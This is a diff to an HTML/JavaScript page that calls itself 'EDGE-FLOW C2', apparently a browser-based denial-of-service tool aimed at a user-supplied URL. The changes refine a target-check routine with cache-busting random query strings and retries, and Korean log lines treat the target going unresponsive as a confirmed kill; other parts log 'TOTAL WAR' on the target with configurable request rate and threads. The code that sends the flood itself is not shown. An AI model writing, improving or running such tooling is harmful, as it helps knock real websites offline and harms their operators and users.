@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>☢️ EDGE-FLOW v8.0 PRECISION</title>
+    <title>☢️ EDGE-FLOW v8.2 FINAL</title>
     <style>
         :root { --neon: #00ff41; --bg: #050505; --warn: #ff3e3e; --scan: #00d4ff; --recon: #f0f000; }
         body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; padding: 15px; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
@@ -26,9 +26,9 @@
 </head>
 <body>
     <div class="header">
-        <h2 style="margin:0; font-size: 1.1em;">[ EDGE-FLOW C2 v8.0 ]</h2>
+        <h2 style="margin:0; font-size: 1.1em;">[ EDGE-FLOW C2 v8.2 ]</h2>
         <div style="text-align: right; font-size: 0.8em;">
-            <span id="statusText">READY</span> | <span id="shotCount">0</span> PKTS
+            <span id="statusText" style="color:#00ff41">READY</span> | <span id="shotCount">0</span> PKTS
         </div>
     </div>
 
@@ -78,26 +78,37 @@
             const target = document.getElementById('target').value.trim();
             if (!target.startsWith('http')) { log("URL ERROR", "error"); return; }
             
-            log("📡 INITIATING PRECISION SCAN...", "recon");
+            log("📡 SCANNING... (ANTI-CACHE MODE)", "recon");
             const start = Date.now();
 
             try {
                 const controller = new AbortController();
-                const timeout = setTimeout(() => controller.abort(), 6000);
+                const timeout = setTimeout(() => controller.abort(), 7000);
 
-                // no-cors 모드로 응답 시간만 체크
-                await fetch(`${target}/?t=${Date.now()}`, { mode: 'no-cors', cache: 'no-store', signal: controller.signal });
+                const cacheBuster = `cb=${Date.now()}_${Math.random().toString(36).substring(7)}`;
+                const finalUrl = target.includes('?') ? `${target}&${cacheBuster}` : `${target}/?${cacheBuster}`;
+
+                await fetch(finalUrl, { 
+                    mode: 'no-cors', 
+                    cache: 'no-store',
+                    priority: 'high',
+                    signal: controller.signal 
+                });
                 
                 const ms = Date.now() - start;
                 clearTimeout(timeout);
+
+                if (ms <= 5) {
+                    log("⚠️ INVALID RESPONSE (0ms) - RETRYING...", "error");
+                    setTimeout(analyzeTarget, 500); 
+                    return;
+                }
                 report(ms);
             } catch (e) {
-                if (e.name === 'AbortError') log("<span class='status-badge' style='background:red;color:#fff'>💀 TERMINATED</span> 타겟 응답 없음. 격침 확인!", "error");
-                else {
-                    const ms = Date.now() - start;
-                    if (ms < 1000) report(ms); // 보안 정책 에러라도 시간 빠르면 생존
-                    else log(`<span class='status-badge' style='background:orange'>🔴 CRITICAL</span> Latency: ${ms}ms - 마비 임계점.`, "error");
-                }
+                const ms = Date.now() - start;
+                if (e.name === 'AbortError') log("<span class='status-badge' style='background:red;color:#fff'>💀 TERMINATED</span> 타겟 응답 없음. 격침!", "error");
+                else if (ms > 10) report(ms);
+                else log("❓ RECON ERROR - URL을 확인하세요.", "error");
             }
         }
 
@@ -114,7 +125,7 @@
 
             document.getElementById('statusText').innerText = "FIRING";
             document.getElementById('statusText').style.color = "red";
-            log(`🚀 TOTAL WAR DECLARED ON ${target}`);
+            log(`🚀 TOTAL WAR: ${target}`);
 
             const rate = parseInt(document.getElementById('rate').value);
             const threads = parseInt(document.getElementById('threads').value);
@@ -133,7 +144,7 @@
         function terminate() {
             clearInterval(attackInterval);
             document.getElementById('statusText').innerText = "READY";
-            document.getElementById('statusText').style.color = "var(--neon)";
+            document.getElementById('statusText').style.color = "#00ff41";
             log("🛑 CEASE FIRE.", "error");
         }
     </script>
